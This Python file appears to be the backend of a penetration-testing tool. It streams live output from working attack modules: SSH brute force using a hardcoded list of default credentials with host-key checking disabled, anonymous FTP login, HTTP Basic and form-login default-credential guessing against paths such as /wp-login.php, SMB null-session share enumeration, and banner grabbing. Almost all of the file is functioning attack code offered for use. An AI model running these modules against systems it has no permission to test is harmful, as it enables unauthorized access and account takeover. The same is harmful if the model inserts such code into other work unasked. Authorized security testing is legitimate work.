"""Enter engine -- self-contained exploitation modules.

Each exploit module is an async generator that yields EnterEvent objects,
enabling real-time streaming of attack output to the frontend via SSE.
"""

import asyncio
import logging
import shutil
from datetime import datetime, timezone
from typing import AsyncGenerator

from backend.models.seek_enter import EnterEvent

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Exploit registry
# ---------------------------------------------------------------------------

EXPLOIT_REGISTRY: dict[str, dict] = {
    "ssh_bruteforce": {
        "name": "SSH Credential Bruteforce",
        "services": ["ssh"],
        "ports": [22, 2222],
        "cves": [],
        "description": "Tests common SSH credentials",
    },
    "ftp_anonymous": {
        "name": "FTP Anonymous Access",
        "services": ["ftp"],
        "ports": [21],
        "cves": [],
        "description": "Checks for anonymous FTP login",
    },
    "http_default_creds": {
        "name": "HTTP Default Credentials",
        "services": ["http", "https", "http-proxy", "https-alt"],
        "ports": [80, 443, 8080, 8443, 8888],
        "cves": [],
        "description": "Tests default web application credentials",
    },
    "smb_null_session": {
        "name": "SMB Null Session",
        "services": ["microsoft-ds", "netbios-ssn"],
        "ports": [445, 139],
        "cves": [],
        "description": "Checks for SMB null session and share enumeration",
    },
    "banner_grab": {
        "name": "Service Banner Grab",
        "services": ["*"],
        "ports": [],
        "cves": [],
        "description": "Grabs service banner for information disclosure",
    },
}


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _event(event_type: str, message: str, module: str = "") -> EnterEvent:
    return EnterEvent(
        event_type=event_type,
        timestamp=_now_iso(),
        message=message,
        module=module,
    )


def select_exploit(service: str, port: int, exploit_id: str = "auto") -> str:
    """Select the best exploit module for a given service/port."""
    if exploit_id != "auto":
        return exploit_id if exploit_id in EXPLOIT_REGISTRY else ""

    for eid, mod in EXPLOIT_REGISTRY.items():
        if eid == "banner_grab":
            continue
        if service in mod["services"] or port in mod["ports"]:
            return eid

    return "banner_grab"


async def run_exploit(
    target_ip: str,
    port: int,
    service: str,
    exploit_id: str,
    options: dict,
) -> AsyncGenerator[EnterEvent, None]:
    """Execute an exploit module, yielding events as they occur."""
    module_name = EXPLOIT_REGISTRY.get(exploit_id, {}).get("name", exploit_id)

    yield _event("info", f"[*] Initializing module: {module_name}", exploit_id)
    yield _event("info", f"[*] Target: {target_ip}:{port} ({service})", exploit_id)
    yield _event("info", "=" * 60, exploit_id)

    if exploit_id == "ssh_bruteforce":
        async for event in _exploit_ssh_bruteforce(target_ip, port, options):
            yield event
    elif exploit_id == "ftp_anonymous":
        async for event in _exploit_ftp_anonymous(target_ip, port, options):
            yield event
    elif exploit_id == "http_default_creds":
        async for event in _exploit_http_default_creds(target_ip, port, service, options):
            yield event
    elif exploit_id == "smb_null_session":
        async for event in _exploit_smb_null_session(target_ip, port, options):
            yield event
    elif exploit_id == "banner_grab":
        async for event in _exploit_banner_grab(target_ip, port, options):
            yield event
    else:
        yield _event("error", f"[!] Unknown exploit module: {exploit_id}", exploit_id)

    yield _event("info", "=" * 60, exploit_id)
    yield _event("complete", "[*] Module execution finished", exploit_id)


# ---------------------------------------------------------------------------
# Individual exploit modules
# ---------------------------------------------------------------------------


async def _exploit_ssh_bruteforce(
    target: str, port: int, options: dict,
) -> AsyncGenerator[EnterEvent, None]:
    """Brute force SSH credentials."""
    module = "ssh_bruteforce"
    creds = [
        ("root", "root"), ("root", "toor"), ("root", "password"),
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("pi", "raspberry"), ("ubuntu", "ubuntu"), ("user", "user"),
        ("root", ""), ("admin", ""),
    ]

    yield _event("command", f"[>] Testing {len(creds)} credential pairs against SSH", module)

    try:
        import asyncssh
        ssh_available = True
    except ImportError:
        ssh_available = False
        yield _event("info", "[!] asyncssh not installed — install with: pip install asyncssh", module)
        yield _event("info", "[*] Falling back to subprocess SSH authentication", module)

    success = False

    if ssh_available:
        for username, password in creds:
            display_pass = password if password else "(empty)"
            yield _event("output", f"    Testing {username}:{display_pass} ...", module)
            await asyncio.sleep(0.1)
            try:
                async with asyncssh.connect(
                    target, port=port, username=username, password=password,
                    known_hosts=None, login_timeout=5,
                ) as conn:
                    result = await conn.run("id", check=False, timeout=3)
                    output = result.stdout.strip() if result.stdout else ""
                    yield _event("success", f"[+] SUCCESS: {username}:{display_pass}", module)
                    yield _event("output", f"    Shell output: {output}", module)
                    access = "root" if "uid=0" in output else "user"
                    yield _event("success", f"[+] Access level: {access}", module)
                    success = True
                    break
            except Exception:
                continue
    else:
        # Fallback: use subprocess ssh with sshpass (Linux) or plink (Windows)
        sshpass_bin = shutil.which("sshpass")
        plink_bin = shutil.which("plink")

        if sshpass_bin:
            yield _event("info", "[*] Using sshpass for credential testing", module)
            for username, password in creds:
                display_pass = password if password else "(empty)"
                yield _event("output", f"    Testing {username}:{display_pass} ...", module)
                try:
                    proc = await asyncio.create_subprocess_exec(
                        sshpass_bin, "-p", password,
                        "ssh", "-o", "StrictHostKeyChecking=no",
                        "-o", "ConnectTimeout=5",
                        "-p", str(port),
                        f"{username}@{target}", "id",
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
                    output = stdout.decode(errors="replace").strip()
                    if proc.returncode == 0 and output:
                        yield _event("success", f"[+] SUCCESS: {username}:{display_pass}", module)
                        yield _event("output", f"    Shell output: {output}", module)
                        access = "root" if "uid=0" in output else "user"
                        yield _event("success", f"[+] Access level: {access}", module)
                        success = True
                        break
                except (asyncio.TimeoutError, Exception):
                    continue
        elif plink_bin:
            yield _event("info", "[*] Using plink for credential testing", module)
            for username, password in creds:
                display_pass = password if password else "(empty)"
                yield _event("output", f"    Testing {username}:{display_pass} ...", module)
                try:
                    proc = await asyncio.create_subprocess_exec(
                        plink_bin, "-ssh", "-batch",
                        "-P", str(port),
                        "-l", username, "-pw", password,
                        target, "id",
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
                    output = stdout.decode(errors="replace").strip()
                    if proc.returncode == 0 and output:
                        yield _event("success", f"[+] SUCCESS: {username}:{display_pass}", module)
                        yield _event("output", f"    Shell output: {output}", module)
                        access = "root" if "uid=0" in output else "user"
                        yield _event("success", f"[+] Access level: {access}", module)
                        success = True
                        break
                except (asyncio.TimeoutError, Exception):
                    continue
        else:
            # Last resort: banner grab only
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target, port), timeout=3,
                )
                banner = await asyncio.wait_for(reader.readline(), timeout=3)
                writer.close()
                await writer.wait_closed()
                yield _event("output", f"    Banner: {banner.decode(errors='replace').strip()}", module)
            except Exception:
                yield _event("error", f"[!] Connection failed to {target}:{port}", module)
            yield _event("error", "[!] No SSH auth tool available. Install asyncssh: pip install asyncssh", module)

    if not success:
        yield _event("error", "[-] No valid credentials found", module)


async def _exploit_ftp_anonymous(
    target: str, port: int, options: dict,
) -> AsyncGenerator[EnterEvent, None]:
    """Check for anonymous FTP access."""
    module = "ftp_anonymous"
    yield _event("command", "[>] Checking for anonymous FTP access", module)

    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(target, port), timeout=5,
        )
        banner = await asyncio.wait_for(reader.readline(), timeout=5)
        yield _event("output", f"    Banner: {banner.decode(errors='replace').strip()}", module)

        writer.write(b"USER anonymous\r\n")
        await writer.drain()
        resp = await asyncio.wait_for(reader.readline(), timeout=5)
        yield _event("output", f"    USER: {resp.decode(errors='replace').strip()}", module)

        writer.write(b"PASS anonymous@\r\n")
        await writer.drain()
        resp = await asyncio.wait_for(reader.readline(), timeout=5)
        resp_str = resp.decode(errors="replace").strip()
        yield _event("output", f"    PASS: {resp_str}", module)

        if resp_str.startswith("230"):
            yield _event("success", "[+] Anonymous FTP login SUCCESSFUL", module)
            writer.write(b"PWD\r\n")
            await writer.drain()
            pwd_resp = await asyncio.wait_for(reader.readline(), timeout=5)
            yield _event("output", f"    PWD: {pwd_resp.decode(errors='replace').strip()}", module)
        else:
            yield _event("error", "[-] Anonymous login rejected", module)

        writer.write(b"QUIT\r\n")
        await writer.drain()
        writer.close()
        await writer.wait_closed()

    except Exception as exc:
        yield _event("error", f"[!] FTP connection failed: {exc}", module)


async def _exploit_http_default_creds(
    target: str, port: int, service: str, options: dict,
) -> AsyncGenerator[EnterEvent, None]:
    """Test default web application credentials."""
    module = "http_default_creds"
    import httpx

    scheme = "https" if port in (443, 8443) or "https" in service else "http"
    base_url = f"{scheme}://{target}:{port}"

    yield _event("command", f"[>] Testing default credentials on {base_url}", module)

    creds = [
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("root", "root"), ("administrator", "administrator"),
        ("admin", "admin123"), ("admin", ""), ("user", "user"),
    ]
    login_paths = ["/", "/login", "/admin", "/admin/login", "/wp-login.php"]

    async with httpx.AsyncClient(verify=False, timeout=5.0, follow_redirects=False) as client:
        yield _event("info", "[*] Phase 1: Testing HTTP Basic Auth", module)
        for username, password in creds:
            display_pass = password if password else "(empty)"
            yield _event("output", f"    {username}:{display_pass} ...", module)
            await asyncio.sleep(0.05)
            try:
                resp = await client.get(base_url, auth=(username, password))
                if resp.status_code not in (401, 403):
                    yield _event("success", f"[+] Basic Auth SUCCESS: {username}:{display_pass} (HTTP {resp.status_code})", module)
                    return
            except Exception:
                continue

        yield _event("info", "[*] Phase 2: Testing form-based login", module)
        for path in login_paths:
            url = f"{base_url}{path}"
            for username, password in creds[:4]:
                yield _event("output", f"    POST {path} {username}:{password} ...", module)
                await asyncio.sleep(0.05)
                try:
                    resp = await client.post(
                        url,
                        data={"username": username, "password": password,
                              "user": username, "pass": password},
                    )
                    if resp.status_code in (302, 303):
                        loc = resp.headers.get("location", "").lower()
                        if any(kw in loc for kw in ("dashboard", "admin", "home", "panel")):
                            yield _event("success", f"[+] Form login SUCCESS: {username}:{password} -> {loc}", module)
                            return
                except Exception:
                    continue

    yield _event("error", "[-] No default credentials worked", module)


async def _exploit_smb_null_session(
    target: str, port: int, options: dict,
) -> AsyncGenerator[EnterEvent, None]:
    """Check for SMB null session access."""
    module = "smb_null_session"
    yield _event("command", f"[>] Testing SMB null session on {target}:{port}", module)

    smb_client = shutil.which("smbclient")

    if smb_client:
        yield _event("info", "[*] Using smbclient for SMB enumeration", module)
        try:
            proc = await asyncio.create_subprocess_exec(
                "smbclient", "-L", f"//{target}", "-N", "-p", str(port),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
            output = stdout.decode(errors="replace")
            error_out = stderr.decode(errors="replace")

            for line in output.splitlines():
                yield _event("output", f"    {line}", module)
            if "Sharename" in output:
                yield _event("success", "[+] SMB null session SUCCESSFUL - shares enumerated", module)
            else:
                yield _event("error", f"[-] SMB null session failed: {error_out.strip()}", module)
        except Exception as exc:
            yield _event("error", f"[!] smbclient failed: {exc}", module)
    else:
        yield _event("info", "[*] smbclient not available, basic port probe only", module)
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port), timeout=5,
            )
            yield _event("output", f"    SMB port {port} is open", module)
            writer.close()
            await writer.wait_closed()
            yield _event("info", "[*] Install smbclient for full SMB enumeration", module)
        except Exception as exc:
            yield _event("error", f"[!] Cannot connect to SMB port: {exc}", module)


async def _exploit_banner_grab(
    target: str, port: int, options: dict,
) -> AsyncGenerator[EnterEvent, None]:
    """Grab service banner for information disclosure."""
    module = "banner_grab"
    yield _event("command", f"[>] Grabbing banner from {target}:{port}", module)

    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(target, port), timeout=5,
        )
        try:
            banner = await asyncio.wait_for(reader.read(4096), timeout=3)
            if banner:
                for line in banner.decode(errors="replace").splitlines():
                    yield _event("output", f"    {line}", module)
                yield _event("success", "[+] Banner captured", module)
            else:
                writer.write(b"HEAD / HTTP/1.0\r\n\r\n")
                await writer.drain()
                response = await asyncio.wait_for(reader.read(4096), timeout=3)
                for line in response.decode(errors="replace").splitlines()[:20]:
                    yield _event("output", f"    {line}", module)
                yield _event("success", "[+] HTTP response captured", module)
        except asyncio.TimeoutError:
            yield _event("info", "[*] No banner received (timeout)", module)

        writer.close()
        await writer.wait_closed()
    except Exception as exc:
        yield _event("error", f"[!] Connection failed: {exc}", module)
